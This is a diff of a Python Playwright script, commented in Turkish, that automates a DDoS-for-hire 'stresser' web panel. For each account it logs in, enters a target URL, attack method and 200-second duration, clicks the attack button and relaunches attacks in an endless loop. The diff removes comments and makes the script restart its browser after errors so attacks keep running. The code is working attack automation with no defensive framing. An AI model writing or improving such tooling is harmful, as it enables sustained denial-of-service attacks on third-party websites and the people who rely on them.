@@ -113,9 +113,7 @@ def attack_worker(account):
                     page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="load")
                     page.wait_for_timeout(3000)
                     
-                    # #layer_7'yi bekle ve tıkla
                     page.wait_for_selector("#layer_7", timeout=20000)
-                    # Tıklama işlemini JavaScript ile yap (daha sağlam)
                     page.evaluate("document.getElementById('layer_7').click()")
                     print(f"[{username}] ✅ #layer_7 tıklandı.")
                     page.wait_for_timeout(2000)
@@ -132,15 +130,13 @@ def attack_worker(account):
                 # ---------- ANA SALDIRI DÖNGÜSÜ (SONSUZ) ----------
                 while True:
                     try:
-                        # Önce #l7host elementinin görünmesini bekle
-                        page.wait_for_selector("#l7host", timeout=20000)
+                        # Sayfa yenilendiğinde #l7host elementini bekle
+                        page.wait_for_selector("#l7host", timeout=30000)  # 30 saniyeye çıkardım
                         
-                        # Formu doldur
                         page.fill("#l7host", target_url)
                         page.select_option("#l7method", value=method)
-                        page.fill("#l7time", "200")  # 200 saniye
+                        page.fill("#l7time", "200")
                         
-                        # Butonun görünmesini bekle ve tıkla (JS ile)
                         page.wait_for_selector("#l7btn-attack", timeout=20000)
                         page.evaluate("document.getElementById('l7btn-attack').click()")
                         print(f"[{username}] 🔥 Saldırı başladı | 200 sn")
@@ -148,13 +144,11 @@ def attack_worker(account):
 
                         # Saldırı durumu takibi
                         while True:
-                            # "No running attacks" yazısı var mı?
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
                                 print(f"[{username}] ⏰ Saldırı bitti (No running attacks).")
                                 break
                             
-                            # Süre bilgisi var mı?
                             expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                             if expire_cell.count() > 0:
                                 expire_text = expire_cell.text_content().strip()
@@ -162,7 +156,6 @@ def attack_worker(account):
                                     print(f"[{username}] ⏰ Süre doldu.")
                                     break
                             
-                            # "Running" yazısı kayboldu mu?
                             running_badge = page.locator(".stats-content .badge:has-text('Running')").first
                             if running_badge.count() == 0:
                                 print(f"[{username}] ⏰ Attack bitti (Running yok).")
@@ -175,7 +168,6 @@ def attack_worker(account):
                         page.reload(wait_until="load")
                         page.wait_for_timeout(3000)
                         
-                        # #layer_7'ye tekrar tıkla
                         page.wait_for_selector("#layer_7", timeout=15000)
                         page.evaluate("document.getElementById('layer_7').click()")
                         page.wait_for_timeout(2000)
@@ -183,16 +175,9 @@ def attack_worker(account):
                     except Exception as inner_err:
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
-                        try:
-                            # Sayfayı yenile ve tekrar dene
-                            page.reload(wait_until="load")
-                            page.wait_for_timeout(5000)
-                            page.wait_for_selector("#layer_7", timeout=15000)
-                            page.evaluate("document.getElementById('layer_7').click()")
-                            page.wait_for_timeout(2000)
-                        except:
-                            pass
-                        continue
+                        # 🔥 KRİTİK DEĞİŞİKLİK: Hata alırsa iç döngüden çık, dış döngü tarayıcıyı yeniden başlatsın
+                        print(f"[{username}] 🔄 Hata nedeniyle tarayıcı yeniden başlatılıyor...")
+                        break  # Bu break iç döngüyü kırar, dış döngü başa döner
 
         except Exception as outer_err:
             print(f"[{username}] 💥 Kritik hata: {outer_err}")
